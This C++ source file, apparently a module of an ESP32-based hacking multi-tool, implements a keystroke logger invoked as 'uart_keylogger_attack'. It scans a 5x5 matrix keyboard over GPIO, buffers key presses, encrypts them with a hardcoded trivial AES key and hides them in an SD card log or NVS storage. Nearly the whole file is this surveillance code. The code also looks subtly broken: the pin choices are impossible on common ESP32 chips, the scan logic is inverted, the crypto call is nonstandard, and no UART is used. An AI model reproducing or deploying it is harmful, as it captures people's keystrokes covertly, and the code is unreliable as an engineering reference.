#include "uart_keylogger.h"
#include "core/display.h"
#include "core/mykeyboard.h"
#include "core/sd_functions.h"
#include "esp_crypto.h"
#include <driver/gpio.h>
#include <esp_intr_alloc.h>
#include <freertos/FreeRTOS.h>
#include <freertos/task.h>
#include <nvs.h>
#include <nvs_flash.h>

// UART Keylogger implementation
class UARTKeylogger {
private:
    // GPIO pins for 5x5 matrix keyboard
    static const int ROW_PINS[5] = {27, 28, 29, 30, 31};  // Lines
    static const int COL_PINS[5] = {32, 33, 34, 35, 36};  // Columns

    // 5x5 matrix keyboard layout
    char keymap[5][5] = {
        {'1', '2', '3', 'A', 'B'},
        {'4', '5', '6', 'C', 'D'},
        {'7', '8', '9', 'E', 'F'},
        {'*', '0', '#', 'G', 'H'},
        {'I', 'J', 'K', 'L', 'M'}
    };

    // Circular buffer in IRAM (1K)
    static const int BUFFER_SIZE = 1024;
    char keystroke_buffer[BUFFER_SIZE];
    int buffer_head = 0;
    int buffer_tail = 0;

    // AES encryption key (fixed in flash)
    static const uint8_t AES_KEY[32] = {
        0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08,
        0x09, 0x0A, 0x0B, 0x0C, 0x0D, 0x0E, 0x0F, 0x10,
        0x11, 0x12, 0x13, 0x14, 0x15, 0x16, 0x17, 0x18,
        0x19, 0x1A, 0x1B, 0x1C, 0x1D, 0x1E, 0x1F, 0x20
    };

    bool running = false;
    TaskHandle_t keylogger_task = NULL;

    // Debounce variables
    static const int DEBOUNCE_MS = 5;
    uint32_t last_key_time[5][5] = {0};

    void init_gpio() {
        // Configure row pins as outputs (pulled low)
        for (int i = 0; i < 5; i++) {
            gpio_set_direction((gpio_num_t)ROW_PINS[i], GPIO_MODE_OUTPUT);
            gpio_set_level((gpio_num_t)ROW_PINS[i], 0);
        }

        // Configure column pins as inputs with pull-up
        for (int i = 0; i < 5; i++) {
            gpio_set_direction((gpio_num_t)COL_PINS[i], GPIO_MODE_INPUT);
            gpio_set_pull_mode((gpio_num_t)COL_PINS[i], GPIO_PULLUP_ONLY);
        }
    }

    void scan_keyboard() {
        while (running) {
            for (int row = 0; row < 5; row++) {
                // Set current row high
                gpio_set_level((gpio_num_t)ROW_PINS[row], 1);

                // Check all columns
                for (int col = 0; col < 5; col++) {
                    if (gpio_get_level((gpio_num_t)COL_PINS[col]) == 0) { // Key pressed (active low)
                        uint32_t now = millis();
                        if (now - last_key_time[row][col] > DEBOUNCE_MS) {
                            char key = keymap[row][col];
                            add_to_buffer(key);
                            last_key_time[row][col] = now;
                        }
                    }
                }

                // Set row back to low
                gpio_set_level((gpio_num_t)ROW_PINS[row], 0);
            }

            delay(10); // Scan every 10ms
        }
    }

    void add_to_buffer(char key) {
        keystroke_buffer[buffer_head] = key;
        buffer_head = (buffer_head + 1) % BUFFER_SIZE;

        // If buffer full, overwrite oldest
        if (buffer_head == buffer_tail) {
            buffer_tail = (buffer_tail + 1) % BUFFER_SIZE;
        }
    }

    int get_buffer_size() {
        if (buffer_head >= buffer_tail) {
            return buffer_head - buffer_tail;
        } else {
            return BUFFER_SIZE - buffer_tail + buffer_head;
        }
    }

    void save_to_sd() {
        if (get_buffer_size() == 0) return;

        // Get keystrokes from buffer
        String keystrokes = "";
        int count = 0;
        int index = buffer_tail;

        while (count < get_buffer_size() && keystrokes.length() < 512) { // Limit to 512 chars per save
            keystrokes += keystroke_buffer[index];
            index = (index + 1) % BUFFER_SIZE;
            count++;
        }

        // Encrypt with AES
        uint8_t encrypted[512];
        size_t encrypted_len = 0;

        esp_crypto_aes_encrypt(AES_KEY, sizeof(AES_KEY),
                              (uint8_t*)keystrokes.c_str(), keystrokes.length(),
                              encrypted, &encrypted_len);

        // Save to SD
        if (setupSdCard()) {
            File file = SD.open("/keystroke.log", FILE_APPEND);
            if (file) {
                file.write(encrypted, encrypted_len);
                file.close();
                tft.println("Keystrokes saved to SD");
            } else {
                save_to_nvs(keystrokes);
            }
        } else {
            save_to_nvs(keystrokes);
        }

        // Clear saved data from buffer
        buffer_tail = index;
    }

    void save_to_nvs(String data) {
        // Fallback to NVS (max 128 bytes)
        nvs_handle_t nvs_handle;
        esp_err_t err = nvs_open("keylogger", NVS_READWRITE, &nvs_handle);
        if (err != ESP_OK) return;

        // Take only first 128 bytes
        if (data.length() > 128) data = data.substring(0, 128);

        err = nvs_set_str(nvs_handle, "keystrokes", data.c_str());
        if (err == ESP_OK) {
            nvs_commit(nvs_handle);
            tft.println("Keystrokes saved to NVS");
        }

        nvs_close(nvs_handle);
    }

    static void keylogger_task_function(void* param) {
        UARTKeylogger* logger = (UARTKeylogger*)param;
        logger->scan_keyboard();
        vTaskDelete(NULL);
    }

public:
    void start_logging() {
        tft.println("Starting UART Keylogger...");
        tft.println("Matrix keyboard: 5x5 GPIO 27-31/32-36");

        init_gpio();
        running = true;

        // Start keylogger task
        xTaskCreate(keylogger_task_function, "keylogger", 4096, this, 1, &keylogger_task);

        tft.println("Keylogger active. Press any key to stop.");

        long last_save = millis();
        while (!check(AnyKeyPress)) {
            // Save every 30 seconds
            if (millis() - last_save > 30000) {
                save_to_sd();
                last_save = millis();
            }
            delay(1000);
        }

        stop_logging();
        save_to_sd(); // Final save
    }

    void stop_logging() {
        running = false;
        if (keylogger_task) {
            vTaskDelete(keylogger_task);
            keylogger_task = NULL;
        }

        // Reset GPIOs
        for (int i = 0; i < 5; i++) {
            gpio_reset_pin((gpio_num_t)ROW_PINS[i]);
            gpio_reset_pin((gpio_num_t)COL_PINS[i]);
        }

        tft.println("Keylogger stopped.");
    }
};

// Global function for UART Keylogger
void uart_keylogger_attack() {
    UARTKeylogger logger;
    logger.start_logging();
}
